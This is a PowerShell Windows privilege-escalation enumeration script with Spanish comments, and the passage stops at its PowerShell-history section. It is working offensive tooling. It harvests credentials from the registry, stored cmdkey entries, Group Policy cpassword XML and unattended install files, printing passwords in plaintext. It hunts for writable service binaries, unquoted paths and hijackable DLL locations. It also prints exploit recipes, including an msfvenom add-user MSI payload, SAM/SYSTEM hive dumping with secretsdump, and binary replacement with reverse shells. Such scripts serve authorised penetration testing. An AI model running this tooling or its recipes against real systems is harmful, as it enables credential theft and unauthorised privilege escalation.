#encoding: UTF-8
$startTime = Get-Date
Write-Host "======== Invoke-Enum v2.0 - $(Get-Date) ========" -ForegroundColor Cyan

# Inicializar array para exportacion
$global:Findings = @()

function Add-Finding {
    param($Category, $Finding, $Risk, $Details)
    $global:Findings += [PSCustomObject]@{
        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        Category = $Category
        Finding = $Finding
        RiskLevel = $Risk
        Details = $Details
    }
}

function Show-Section($txt) {
    Write-Host "`n======================= $txt =======================" -ForegroundColor Magenta
}
function Safe-ACL($path) { try { return Get-Acl $path } catch { return $null } }
function Safe-Child($p, $filter) { try { return Get-ChildItem -Path $p -Recurse -Filter $filter -ErrorAction SilentlyContinue } catch { return @() } }
function Safe-Props($key) { try { return Get-ItemProperty -Path $key -ErrorAction SilentlyContinue } catch { return $null } }

$ErrorActionPreference = "SilentlyContinue"
$outputFile = "Enum-Report-$($env:COMPUTERNAME)-$(Get-Date -Format 'yyyyMMdd-HHmmss')"

# ================= Informacion del Sistema =================
Show-Section "Informacion del Sistema"

function Safe-Get {
    param (
        [ScriptBlock]$Primary,
        [ScriptBlock]$Fallback
    )
    Try {
        & $Primary
    } Catch {
        & $Fallback
    }
}

Try {
    $os = Safe-Get { Get-CimInstance Win32_OperatingSystem } { Get-WmiObject Win32_OperatingSystem }
    $cs = Safe-Get { Get-CimInstance Win32_ComputerSystem } { Get-WmiObject Win32_ComputerSystem }
    $patches = Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 5

    $sysInfo = @"
Nombre del sistema operativo: $($os.Caption)
Version: $($os.Version) - Build $($os.BuildNumber)
Arquitectura: $($os.OSArchitecture)
Idioma del sistema: $($os.MUILanguages -join ', ')
Usuario actual: $env:USERNAME
Nombre del host: $env:COMPUTERNAME
Fabricante: $($cs.Manufacturer)
Modelo: $($cs.Model)
"@

    Write-Host $sysInfo -ForegroundColor Cyan
    Add-Finding -Category "System Info" -Finding "Basic System Information" -Risk "Info" -Details $sysInfo

    $installDate = $os.InstallDate
    if ($installDate -is [string]) {
        $installDate = [Management.ManagementDateTimeConverter]::ToDateTime($installDate)
    }
    Write-Host "Fecha de instalacion: $installDate" -ForegroundColor Cyan

    $bootTime = $os.LastBootUpTime
    if ($bootTime -is [string]) {
        $bootTime = [Management.ManagementDateTimeConverter]::ToDateTime($bootTime)
    }
    Write-Host "ultimo reinicio: $bootTime" -ForegroundColor Cyan

    Write-Host "`nultimos parches instalados:" -ForegroundColor Yellow
    $patchInfo = ""
    foreach ($p in $patches) {
        $patchInfo += "  - $($p.HotFixID) instalado el $($p.InstalledOn)`n"
        Write-Host "  - $($p.HotFixID) instalado el $($p.InstalledOn)" -ForegroundColor White
    }
    Add-Finding -Category "System Info" -Finding "Last Patches" -Risk "Info" -Details $patchInfo
}
Catch {
    Write-Host "[!] Error al obtener informacion del sistema." -ForegroundColor Red
    Add-Finding -Category "System Info" -Finding "Error" -Risk "Info" -Details "Error getting system information"
}

# ================= CHECK UAC =================
Show-Section "UAC Settings"
Try {
    $uac = reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA 2>$null
    if ($uac -match "0x1") {
        Write-Host "[!] UAC Habilitado (EnableLUA=1)" -ForegroundColor Yellow
        Add-Finding -Category "UAC" -Finding "UAC Enabled" -Risk "Medium" -Details "User Account Control is enabled"
    } else {
        Write-Host "[!] UAC Deshabilitado (EnableLUA=0)" -ForegroundColor Red
        Add-Finding -Category "UAC" -Finding "UAC Disabled" -Risk "High" -Details "User Account Control is disabled - easier privilege escalation"
    }
} catch {
    Write-Host "[!] No se pudo verificar UAC" -ForegroundColor DarkGray
}

# ================= DPAPI USER CREDENTIALS =================
Show-Section "DPAPI User Credentials"
Write-Host "[*] Buscando credenciales DPAPI de usuarios..." -ForegroundColor Yellow

Try {

    $dpapiKeys = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\Environment"
    )
    
    foreach ($key in $dpapiKeys) {
        $props = Safe-Props $key
        if ($props) {
            $props.PSObject.Properties | Where-Object { 
                $_.Name -match "password|cred|key|secret|token" -or 
                $_.Value -match "password|cred|key|secret|token" 
            } | ForEach-Object {
                Write-Host "[DPAPI] $key\$($_.Name) = $($_.Value)" -ForegroundColor Red
                Add-Finding -Category "DPAPI" -Finding "Potential Credential" -Risk "High" -Details "$key\$($_.Name) = $($_.Value)"
            }
        }
    }
    
    $credFiles = @(
        "$env:USERPROFILE\*.cred",
        "$env:USERPROFILE\*.key",
        "$env:USERPROFILE\*.pfx",
        "$env:APPDATA\*.cred",
        "$env:LOCALAPPDATA\*.key"
    )
    
    foreach ($pattern in $credFiles) {
        Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue | ForEach-Object {
            Write-Host "[DPAPI] Archivo de credenciales: $($_.FullName)" -ForegroundColor Red
            Add-Finding -Category "DPAPI" -Finding "Credential File" -Risk "High" -Details "Found: $($_.FullName)"
        }
    }
} catch {
    Write-Host "[!] Error buscando credenciales DPAPI" -ForegroundColor DarkGray
}

# ================= INFORMACION DE RED =================
Show-Section "Informacion de red extendida"
Try {
    $ipConfig = ipconfig /all | Out-String
    $route = route print | Out-String
    
    Write-Host $ipConfig -ForegroundColor White
    Write-Host $route -ForegroundColor White
    
    Add-Finding -Category "Network" -Finding "IP Configuration" -Risk "Info" -Details $ipConfig
    Add-Finding -Category "Network" -Finding "Routing Table" -Risk "Info" -Details $route
} catch {
    Write-Host "[!] Error obteniendo informacion de red" -ForegroundColor Red
}

# ================= USUARIOS Y PRIVILEGIOS =================
Show-Section "Usuarios y Privilegios"
Try { 
    $users = net user | Out-String
    $admins = net localgroup Administradores | Out-String
    $privs = whoami /priv | Out-String
    
    Write-Host $users -ForegroundColor Cyan
    Write-Host $admins -ForegroundColor Cyan
    Write-Host $privs -ForegroundColor Cyan
    
    Add-Finding -Category "Users" -Finding "Local Users" -Risk "Info" -Details $users
    Add-Finding -Category "Users" -Finding "Administrators Group" -Risk "Info" -Details $admins
    Add-Finding -Category "Privileges" -Finding "Current User Privileges" -Risk "Info" -Details $privs
} catch {}

# ================= ALWAYSINSTALL ELEVATED =================
Show-Section "AlwaysInstallElevated"
Write-Host "[*] POC: Si ambas claves valen 1, puedes ejecutar MSI como SYSTEM"
Write-Host "[+] Exploit: msfvenom -p windows/adduser USER=hacker PASS=123456 -f msi > evil.msi"
Write-Host "[+] Ejecutar: msiexec /quiet /qn /i evil.msi"
Try { 
    $aie1 = reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null
    $aie2 = reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null
    Write-Host "HKCU: $aie1" -ForegroundColor Yellow
    Write-Host "HKLM: $aie2" -ForegroundColor Yellow
    
    if ($aie1 -match "0x1" -and $aie2 -match "0x1") {
        Add-Finding -Category "PrivEsc" -Finding "AlwaysInstallElevated Enabled" -Risk "Critical" -Details "Both registry keys set to 1 - MSI files run as SYSTEM"
    }
} catch {}

# ================= AUTOLOGON =================
Show-Section "Autologon"
Write-Host "[*] POC: Puede revelar usuario y contrasena configurados para login automatico"
Write-Host "[+] Exploit: Extraer DefaultUserName y DefaultPassword y loguearte localmente"
Try { 
    $autoLogon = reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>$null | findstr Default
    Write-Host $autoLogon -ForegroundColor Yellow
    if ($autoLogon -match "DefaultPassword") {
        Add-Finding -Category "Credentials" -Finding "Autologon Password Found" -Risk "High" -Details $autoLogon
    }
} catch {}

# ================= CMDKEY =================
Show-Section "Credenciales (cmdkey)"
Write-Host "[*] POC: Lista credenciales almacenadas para conexiones remotas"
Write-Host "[+] Exploit: Usar cmdkey /list y luego runas /savecred para ejecutar como otro usuario"
Try { 
    $cmdkey = cmdkey /list 2>$null
    Write-Host $cmdkey -ForegroundColor Yellow
    if ($cmdkey) {
        Add-Finding -Category "Credentials" -Finding "Stored Credentials" -Risk "Medium" -Details $cmdkey
    }
} catch {}

# ================= TOKENS PRIVILEGIADOS =================
Show-Section "Tokens Privilegiados"
$tokens = @("SeAssignPrimaryTokenPrivilege","SeImpersonatePrivilege","SeBackupPrivilege","SeRestorePrivilege",
"SeTakeOwnershipPrivilege","SeDebugPrivilege","SeLoadDriverPrivilege","SeTcbPrivilege",
"SeManageVolumePrivilege","SeCreateTokenPrivilege")
Try {
    $privs = whoami /priv
    foreach ($t in $tokens) {
        if ($privs -match $t) {
            Write-Host "[!] Token detectado: $t" -ForegroundColor Red
            switch ($t) {
                "SeImpersonatePrivilege" { 
                    Write-Host "[+] Exploit: Usar PrintSpoofer, RoguePotato, JuicyPotato para escalar a SYSTEM" -ForegroundColor Cyan
                    Add-Finding -Category "Privileges" -Finding "SeImpersonatePrivilege" -Risk "High" -Details "Use PrintSpoofer/RoguePotato for privilege escalation"
                }
                "SeAssignPrimaryTokenPrivilege" { 
                    Write-Host "[+] Exploit: Crear proceso con token primario (S4U o abuso de servicio)" -ForegroundColor Cyan
                    Add-Finding -Category "Privileges" -Finding "SeAssignPrimaryTokenPrivilege" -Risk "High" -Details "Create process with primary token"
                }
                "SeDebugPrivilege" { 
                    Write-Host "[+] Exploit: Inyectar procesos SYSTEM (ej: con mimikatz o ProcessHacker)" -ForegroundColor Cyan
                    Add-Finding -Category "Privileges" -Finding "SeDebugPrivilege" -Risk "High" -Details "Debug processes and inject code"
                }
                "SeBackupPrivilege" { 
                    Write-Host "[+] Exploit: Leer SAM/SYSTEM con 'reg save'" -ForegroundColor Cyan
                    Add-Finding -Category "Privileges" -Finding "SeBackupPrivilege" -Risk "High" -Details "Read SAM/SYSTEM hives with reg save"
                }
                "SeRestorePrivilege" { 
                    Write-Host "[+] Exploit: Restaurar archivos protegidos o reemplazar binarios" -ForegroundColor Cyan
                    Add-Finding -Category "Privileges" -Finding "SeRestorePrivilege" -Risk "High" -Details "Restore protected files or replace binaries"
                }
                "SeTakeOwnershipPrivilege" { 
                    Write-Host "[+] Exploit: Tomar propiedad con 'takeown' y cambiar ACL con 'icacls'" -ForegroundColor Cyan
                    Add-Finding -Category "Privileges" -Finding "SeTakeOwnershipPrivilege" -Risk "High" -Details "Take ownership of files and change ACLs"
                }
                "SeLoadDriverPrivilege" { 
                    Write-Host "[+] Exploit: Cargar drivers maliciosos si no hay control de firmas" -ForegroundColor Cyan
                    Add-Finding -Category "Privileges" -Finding "SeLoadDriverPrivilege" -Risk "High" -Details "Load malicious drivers if no signature enforcement"
                }
                "SeTcbPrivilege" { 
                    Write-Host "[+] Exploit: Actuar como subsistema confiable (muy potente, raro de explotar)" -ForegroundColor Cyan
                    Add-Finding -Category "Privileges" -Finding "SeTcbPrivilege" -Risk "Critical" -Details "Act as part of trusted computing base"
                }
                "SeManageVolumePrivilege" { 
                    Write-Host "[+] Exploit: Leer disco crudo o montar volumenes manualmente" -ForegroundColor Cyan
                    Add-Finding -Category "Privileges" -Finding "SeManageVolumePrivilege" -Risk "High" -Details "Read raw disk or mount volumes manually"
                }
                "SeCreateTokenPrivilege" { 
                    Write-Host "[+] Exploit: Crear tokens arbitrarios. Requiere tecnicas avanzadas" -ForegroundColor Cyan
                    Add-Finding -Category "Privileges" -Finding "SeCreateTokenPrivilege" -Risk "Critical" -Details "Create arbitrary tokens - advanced techniques required"
                }
            }
        }
    }
} catch {}

# ================= Servicios con rutas sin comillas =================
Show-Section "Servicios con rutas sin comillas (Unquoted Service Paths)"

Write-Host "[*] POC: Si la ruta tiene espacios y no esta entre comillas, puedes abusar de carpetas intermedias"
Write-Host "[+] Exploit: Crear ejecutable en ruta parcial y reiniciar el servicio"

$found = $false

Try {
    Get-WmiObject Win32_Service | ForEach-Object {
        $svc = $_
        $rawPath = $svc.PathName

        if ($rawPath -and $rawPath -match ' ' -and $rawPath -notmatch '^".*"$') {
            $exe = ($rawPath -split ' ')[0]
            $exeName = Split-Path $exe -Leaf

            if ($exeName -notmatch "svchost.exe|dllhost.exe|taskhostw.exe|conhost.exe" -and `
                $exe -notmatch "^C:\\Windows") {

                Write-Host ""
                Write-Host "[!] Servicio vulnerable: $($svc.Name)" -ForegroundColor Red
                Write-Host "    Binario: $exe" -ForegroundColor Yellow
                Write-Host "    Sugerencia: Ejecuta 'sc qc $($svc.Name)' para validarlo manualmente" -ForegroundColor DarkGray
                Add-Finding -Category "Services" -Finding "Unquoted Service Path" -Risk "High" -Details "Service: $($svc.Name), Path: $exe"
                $found = $true
            }
        }
    }

    if (-not $found) {
        Write-Host "[*] No se detectaron rutas sin comillas fuera de C:\\Windows." -ForegroundColor Green
    }
}
Catch {
    Write-Host "[!] Error durante el escaneo de rutas sin comillas." -ForegroundColor DarkGray
}

# ================= Carpetas con permisos WRITE/MODIFY =================
Show-Section "Carpetas vulnerables con permisos WRITE/MODIFY "

$programDirs = @("C:\", "C:\Program Files", "C:\Program Files (x86)")
$maxDepth = 3

function Get-SubDirs($path, $depth) {
    if ($depth -le 0) { return @() }
    try {
        $subs = Get-ChildItem -Path $path -Directory -Force -ErrorAction Stop
        $all = @($path)
        foreach ($sub in $subs) {
            $all += Get-SubDirs -path $sub.FullName -depth ($depth - 1)
        }
        return $all
    } catch {
        return @()
    }
}

foreach ($base in $programDirs) {
    $dirs = Get-SubDirs -path $base -depth $maxDepth
    foreach ($dir in $dirs) {
        try {
            $acl = Safe-ACL $dir
            if ($acl) {
                foreach ($entry in $acl.Access) {
                    if ($entry.IdentityReference -match "Users|Everyone|Authenticated Users" -and `
                        $entry.FileSystemRights.ToString() -match "Write|Modify|FullControl") {
                        Write-Host "[!] Carpeta vulnerable: $dir" -ForegroundColor Yellow
                        Add-Finding -Category "FileSystem" -Finding "Writable Directory" -Risk "Medium" -Details "Directory: $dir, Permission: $($entry.IdentityReference): $($entry.FileSystemRights)"
                        break
                    }
                }
            }
        } catch {}
    }
}

# ================= Servicios con binarios modificables por el usuario =================
Show-Section "Servicios con binarios modificables por el usuario"

Write-Host "[*] POC: Si puedes modificar el binario que ejecuta un servicio SYSTEM, puedes escalar"
Write-Host "[+] Exploit: Reemplazar binario y reiniciar servicio"

$found = $false

Try {
    Get-WmiObject Win32_Service | ForEach-Object {
        Try {
            $path = $_.PathName -replace '"',''
            $bin = ($path -split '\.exe')[0] + ".exe"

            if (Test-Path $bin) {
                $acl = Safe-ACL $bin
                if ($acl) {
                    foreach ($entry in $acl.Access) {
                        if ($entry.IdentityReference -match "Users|Everyone|Authenticated Users" -and `
                            $entry.FileSystemRights.ToString() -match "Write|Modify|FullControl") {
                            Write-Host "`n[!] Servicio vulnerable: $($_.Name)" -ForegroundColor Red
                            Write-Host "    Binario: $bin" -ForegroundColor Yellow
                            Write-Host "    Permiso: $($entry.IdentityReference): $($entry.FileSystemRights)" -ForegroundColor Green
                            Add-Finding -Category "Services" -Finding "Writable Service Binary" -Risk "High" -Details "Service: $($_.Name), Binary: $bin, Permission: $($entry.IdentityReference): $($entry.FileSystemRights)"
                            $found = $true
                        }
                    }
                }
            }
        } Catch {
            continue
        }
    }

    if (-not $found) {
        Write-Host "[*] No se encontraron servicios vulnerables con binarios modificables." -ForegroundColor Cyan
    }
} Catch {
    Write-Host "[!] Error critico al analizar servicios modificables." -ForegroundColor DarkGray
}

# ================= Environment PATH - DLL Hijack =================
Show-Section "Variables de entorno PATH y rutas hijackables"
Write-Host "`n[?] Tal vez puedas abusar de modificar/crear un binario o DLL en alguna de las siguientes rutas del PATH:"
Write-Host "[+] Verificar la ruta del binario: sc.exe qc dllsvc"

Try {
    $user = "$env:USERNAME"
    $pathDirs = $env:PATH -split ';' | Where-Object { $_ -and (Test-Path $_) }

    foreach ($path in $pathDirs) {
        Try {
            $acl = Get-Acl $path
            foreach ($entry in $acl.Access) {
                if ($entry.IdentityReference -match "Users|Everyone|Authenticated Users" -and `
                    ($entry.FileSystemRights.ToString() -match "Write|Modify|FullControl")) {

                    Write-Host "`n[*] Hijackable PATH Entry: $path" -ForegroundColor Yellow
                    Write-Host "    Usuario: $($entry.IdentityReference) Permiso: $($entry.FileSystemRights)" -ForegroundColor Green
                    Write-Host "[!] Possible DLL Hijacking in: $path [$($entry.IdentityReference): $($entry.FileSystemRights)]" -ForegroundColor Red
                    Write-Host "======================================================================================" -ForegroundColor DarkGray
                    Add-Finding -Category "PrivEsc" -Finding "DLL Hijacking Potential" -Risk "High" -Details "PATH: $path, Permission: $($entry.IdentityReference): $($entry.FileSystemRights)"
                }
            }
        } Catch {
            Write-Host "    [!] No se pudo evaluar permisos para: $path" -ForegroundColor DarkGray
        }
    }
}
Catch {
    Write-Host "[!] Error general al procesar variables de entorno." -ForegroundColor Red
}

# ================= AUTORUNS - MODIFICABLES =================
Show-Section "Autoruns - Ejecutables con posibles modificaciones"
Write-Host "[*] POC: Claves Run pueden contener rutas a ejecutables controlables"
Write-Host "[+] Exploit: Modificar ruta de ejecutable o reemplazar binario si hay permisos"
$runKeys = @("HKCU:\Software\Microsoft\Windows\CurrentVersion\Run", "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run")
foreach ($key in $runKeys) {
    $props = Safe-Props $key
    if ($props) {
        $props.PSObject.Properties | ForEach-Object {
            if ($_.Value -match ".exe") {
                Write-Host "[Autorun] $($_.Name): $($_.Value)" -ForegroundColor Yellow
                Add-Finding -Category "Persistence" -Finding "Autorun Entry" -Risk "Medium" -Details "Registry: $key, Name: $($_.Name), Value: $($_.Value)"
            }
        }
    }
}

# ================= TAREAS PROGRAMADAS =================
Show-Section "Tareas programadas del usuario (no-Microsoft)"
Write-Host "[*] POC: Las tareas pueden ejecutarse automaticamente con permisos elevados"
Write-Host "[+] Exploit:"
Write-Host "  1. Buscar tareas que se ejecuten como SYSTEM o con RunLevel=Highest"
Write-Host "  2. Verificar si el binario asociado es modificable por el usuario actual"
Write-Host "  3. Si es modificable, reemplazar por binario malicioso y esperar ejecucion"

Try {
    $tasks = Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" }
    if ($tasks) {
        $tasks | Format-Table TaskName, TaskPath, State -AutoSize
        Add-Finding -Category "Scheduled Tasks" -Finding "Non-Microsoft Scheduled Tasks" -Risk "Medium" -Details ($tasks | Out-String)
    }
}
Catch {
    Write-Host "[!] Error procesando tareas con Get-ScheduledTask" -ForegroundColor DarkGray
}

Try {
    $lines = schtasks /query /fo LIST /v | findstr '\"' | findstr /V /R "\\Microsoft"
    $shown = @{}

    foreach ($line in $lines) {
        if ($line -match '^Tarea que se ejecutar.*?:\s+(.*)$') {
            $exe = $matches[1].Trim()
            if (-not $shown.ContainsKey($exe)) {
                $shown[$exe] = $true
                Write-Host "[*] Ejecutable: $exe" -ForegroundColor Yellow
                Add-Finding -Category "Scheduled Tasks" -Finding "Scheduled Task Executable" -Risk "Medium" -Details "Executable: $exe"
            }
        }
    }
} Catch {
    Write-Host "[!] Error ejecutando schtasks" -ForegroundColor DarkGray
}

# ======================= Puertos abiertos + servicios =======================
Show-Section "Puertos abiertos + servicios"
Write-Host "[*] POC: Mostrar procesos que escuchan en puertos locales"
Write-Host "[+] Exploit: Identificar servicios vulnerables accesibles por red local o remota"

Try {
    $unique = @{}
    netstat -aon | findstr LISTENING | ForEach-Object {
        $line = ($_ -replace '\s+', ' ').Trim()
        $parts = $line.Split(' ')
        if ($parts.Length -ge 5) {
            $proto = $parts[0]
            $local = $parts[1]
            $mypid = $parts[-1]
            $port = ($local.Split(':')[-1]) -replace '[^\d]', ''

            if (-not $unique.ContainsKey($mypid)) {
                try {
                    $proc = (Get-Process -Id $mypid -ErrorAction Stop).ProcessName
                } catch {
                    $proc = "Desconocido"
                }

                $unique[$mypid] = [PSCustomObject]@{
                    Protocolo = $proto
                    Puerto    = $port
                    Proceso   = $proc
                    PID       = $mypid
                }
            }
        }
    }

    $portInfo = $unique.Values | Sort-Object Puerto | Format-Table -AutoSize | Out-String
    Write-Host $portInfo -ForegroundColor Cyan
    Add-Finding -Category "Network" -Finding "Open Ports" -Risk "Info" -Details $portInfo
} catch {
    Write-Host "[!] Error al obtener puertos y procesos" -ForegroundColor Red
}

# ================= BUSQUEDA EXTENSIVA =================
Show-Section "Busqueda extensiva forzada (solo FULLCONTROL Users/Everyone)"

Write-Host "[*] POC: Ejecutables con permisos FULLCONTROL para Everyone o Users pueden ser sustituidos maliciosamente"
Write-Host "[+] Exploit:"
Write-Host "  1. Busca binarios *.exe modificables ubicados fuera de system32"
Write-Host "  2. Inyecta tu payload (por ejemplo un reverse shell o add admin)"
Write-Host "  3. Espera ejecucion por parte de un proceso privilegiado (servicio, login script, etc.)"

$excludedFolders = @("C:\Windows", "C:\PerfLogs", "C:\Symbols")

function IsExcluded {
    param($path)
    foreach ($exclude in $excludedFolders) {
        if ($path -like "$exclude*") { return $true }
    }
    return $false
}

Try {
    Get-ChildItem -Path "C:\" -File -Recurse -Force -ErrorAction SilentlyContinue | Where-Object {
        $_.Extension -eq ".exe" -and (-not (IsExcluded $_.FullName))
    } | ForEach-Object {
        $acl = Safe-ACL $_.FullName
        if ($acl) {
            foreach ($entry in $acl.Access) {
                if ($entry.IdentityReference -match "Users|Everyone" -and `
                    $entry.FileSystemRights.ToString() -eq "FullControl") {
                    Write-Host "[+] Ejecutable vulnerable: $($_.FullName)" -ForegroundColor Red
                    Write-Host "    Usuario : $($entry.IdentityReference)" -ForegroundColor Yellow
                    Write-Host "    Permisos: $($entry.FileSystemRights)" -ForegroundColor Green
                    Add-Finding -Category "FileSystem" -Finding "Writable Executable" -Risk "High" -Details "File: $($_.FullName), Permission: $($entry.IdentityReference): $($entry.FileSystemRights)"
                }
            }
        }
    }
}
Catch {
    Write-Host "[!] Error durante la busqueda extensiva." -ForegroundColor DarkGray
}

# ================= PROGRAMAS INSTALADOS =================
Show-Section "Aplicaciones instaladas de terceros (no Windows)"
Write-Host "[*] POC: Aplicaciones no Microsoft pueden tener vulnerabilidades locales"
Write-Host "[+] Exploit: Verificar versiones vulnerables con searchsploit o CVE DB"
Try {
    $apps = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Where-Object { $_.DisplayName -and $_.DisplayName -notmatch "Microsoft|Windows" }
    
    if ($apps) {
        foreach ($app in $apps) {
            Write-Host "[+] $($app.DisplayName) - $($app.DisplayVersion)" -ForegroundColor Cyan
            Add-Finding -Category "Software" -Finding "Third-Party Application" -Risk "Info" -Details "$($app.DisplayName) - $($app.DisplayVersion)"
        }
    }
} catch {}

# ================= SERVICIOS CON VERSION =================
Show-Section "Servicios con version de binario"
Write-Host "[*] POC: Ver versiones para detectar binarios desactualizados o con CVEs conocidos"
Write-Host "[+] Exploit: Buscar el hash o nombre del servicio en searchsploit / vulndb"
Try {
    Get-WmiObject Win32_Service | ForEach-Object {
        $path = $_.PathName -replace '"',''
        if (Test-Path $path) {
            Try {
                $ver = (Get-Item $path).VersionInfo.FileVersion
                Write-Host "[Servicio] $($_.Name) => $ver" -ForegroundColor Cyan
                Add-Finding -Category "Services" -Finding "Service Version" -Risk "Info" -Details "Service: $($_.Name), Version: $ver"
            } catch {}
        }
    }
} catch {}

# ================= Archivos Ejecutables Modificables =================
Show-Section "Archivos ejecutables/scripting con permisos WRITE"

Write-Host "[*] POC: Archivos que pueden ser reemplazados o modificados para ejecucion automatica"
Write-Host "[+] Exploit: Reemplazar payloads (.exe, .bat, .dll, .ps1, .vbs, .msi) y abusar ejecucion"

$extensions = @(".exe", ".bat", ".cmd", ".ps1", ".vbs", ".dll", ".msi")
$excludePaths = @("C:\Windows", "C:\PerfLogs")

function IsExcluded {
    param($path)
    foreach ($exclude in $excludePaths) {
        if ($path -like "$exclude*") { return $true }
    }
    return $false
}

Try {
    Get-ChildItem -Path "C:\" -Recurse -Force -File -ErrorAction SilentlyContinue | Where-Object {
        $ext = $_.Extension.ToLower()
        ($extensions -contains $ext) -and (-not (IsExcluded $_.FullName))
    } | ForEach-Object {
        $acl = Safe-ACL $_.FullName
        if ($acl) {
            foreach ($entry in $acl.Access) {
                if ($entry.IdentityReference -match "Users|Everyone|Authenticated Users" -and `
                    $entry.FileSystemRights.ToString() -match "Write|Modify|FullControl") {
                    Write-Host "[!] Archivo vulnerable: $($_.FullName)" -ForegroundColor Red
                    Write-Host "    Usuario: $($entry.IdentityReference)" -ForegroundColor Yellow
                    Write-Host "    Permisos: $($entry.FileSystemRights)" -ForegroundColor Green
                    Write-Host "======================================================================================" -ForegroundColor DarkGray
                    Add-Finding -Category "FileSystem" -Finding "Writable Script/Executable" -Risk "High" -Details "File: $($_.FullName), Permission: $($entry.IdentityReference): $($entry.FileSystemRights)"
                }
            }
        }
    }
}
Catch {
    Write-Host "[!] Error al enumerar archivos modificables." -ForegroundColor DarkGray
}

# ================= SAM & SYSTEM HIVES =================
Show-Section "SAM & SYSTEM Hives Profundos"
Write-Host "[*] POC: Dump de hives permite extraer hashes de usuarios locales"
Write-Host "[+] Exploit manual: reg save HKLM\\SAM C:\\Temp\\sam.save && reg save HKLM\\SYSTEM C:\\Temp\\system.save"
Write-Host "[+] Analizar con: secretsdump.py -sam sam.save -system system.save LOCAL"

$hives = @("SAM", "SYSTEM")
$dirs = @("C:\Windows\Repair", "C:\Windows\System32\config", "C:\windows.old\windows\System32")

foreach ($h in $hives) {
    foreach ($d in $dirs) {
        $f = "$d\$h"
        if (Test-Path $f) {
            Write-Host "[+] Hive encontrado: $f" -ForegroundColor Cyan
            Add-Finding -Category "Credentials" -Finding "SAM/SYSTEM Hive" -Risk "High" -Details "Found: $f"
        }
    }
}

# ================= GPP - Groups.xml =================
Show-Section "GPP - Groups.xml"

Write-Host "[*] POC: Claves cpassword en XML permiten recuperar passwords"
Write-Host "[+] Exploit: Usar GPPDecrypter para descifrar la password"

Try {
    $groups = Get-ChildItem -Path "C:\*" -Filter "Groups.xml" -Recurse -Force -ErrorAction SilentlyContinue
    if ($groups) {
        foreach ($file in $groups) {
            Write-Host "`n[*] Encontrado: $($file.FullName)" -ForegroundColor Red
            Try {
                $content = Get-Content $file.FullName
                $cpass = $content | Select-String "cpassword"
                if ($cpass) {
                    Write-Host "    $cpass" -ForegroundColor Yellow
                    Add-Finding -Category "Credentials" -Finding "GPP Password" -Risk "Critical" -Details "File: $($file.FullName), Content: $cpass"
                }
            } Catch {
                Write-Host "    [!] No se pudo leer el contenido del archivo." -ForegroundColor DarkGray
            }
        }
    }
}
Catch {
    Write-Host "[!] Error general al buscar Groups.xml" -ForegroundColor DarkGray
}

# ================= ARCHIVOS UNATTENDED =================
Show-Section "Archivos Unattended"

Write-Host "[*] POC: Archivos XML pueden contener passwords en texto plano"
Write-Host "[+] Exploit: Buscar Password y usarla con runas, psexec o SMB"

$files = @("unattend.xml", "sysprep.xml", "autounattend.xml")
$dirs = @("C:\")
$seenPaths = @{}

foreach ($d in $dirs) {
    foreach ($f in $files) {
        Try {
            $found = Get-ChildItem -Path "$d*" -Filter $f -Recurse -Force -ErrorAction SilentlyContinue
            foreach ($fnd in $found) {
                if (-not $seenPaths.ContainsKey($fnd.FullName)) {
                    $seenPaths[$fnd.FullName] = $true
                    Write-Host "`n[!] $($fnd.FullName)" -ForegroundColor Yellow
                    Try {
                        $lines = Get-Content $fnd.FullName
                        $insideBlock = $false
                        $passwordContent = ""
                        foreach ($line in $lines) {
                            if ($line -match "<Password>") {
                                $insideBlock = $true
                            }

                            if ($insideBlock) {
                                $passwordContent += "    $line`n"
                                Write-Host "    $line" -ForegroundColor Green
                            }

                            if ($line -match "</Password>") {
                                $insideBlock = $false
                            }

                            if ($line -match "<Username>|<Enabled>") {
                                Write-Host "    $line" -ForegroundColor Cyan
                                $passwordContent += "    $line`n"
                            }
                        }
                        if ($passwordContent) {
                            Add-Finding -Category "Credentials" -Finding "Unattended Password" -Risk "Critical" -Details "File: $($fnd.FullName)`n$passwordContent"
                        }
                    } Catch {
                        Write-Host "    [!] No se pudo leer el archivo." -ForegroundColor DarkGray
                    }
                }
            }
        } Catch {}
    }
}

# ================= Archivos Sensibles en Disco =================
Show-Section "Archivos Sensibles en Disco"

$sensitiveExts = @(
    "*.pem", "*.key", "*.pfx", "*.kdbx", "*.sql", "*.bak", "*.db", "*.sqlite",
    "*.config", "*.ini", "*.keytab", "*.rdp",
    "*.ovpn", ".aws", ".azureProfile.json"
)

$searchDirs = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Downloads",
    "$env:APPDATA",
    "$env:LOCALAPPDATA",
    "C:\", "D:\", "E:\"
)

$reportedPaths = [System.Collections.Generic.HashSet[string]]::new()

foreach ($dir in $searchDirs) {
    foreach ($ext in $sensitiveExts) {
        try {
            $found = Get-ChildItem -Path $dir -Filter $ext -Recurse -ErrorAction SilentlyContinue -Force
            foreach ($file in $found) {
                $path = $file.FullName

                if ($path -match "Microsoft\\|Windows\\|microsoft\\|windows\\") {
                    continue
                }

                if (-not $reportedPaths.Contains($path)) {
                    $reportedPaths.Add($path) | Out-Null
                    Write-Host "[!] Posible archivo sensible: $path" -ForegroundColor Yellow
                    Add-Finding -Category "Sensitive Files" -Finding "Potential Sensitive File" -Risk "Medium" -Details "Found: $path"
                }
            }
        } catch {
            continue
        }
    }
}


# ================= HISTORIAL DE POWERSHELL =================
Show-Section "Historial de Powershell"

Write-Host "[*] Buscando historial de PowerShell en perfiles de usuario..." -ForegroundColor Yellow
Write-Host "[+] Los archivos de historial pueden contener comandos sensibles, passwords, etc." -ForegroundColor Cyan

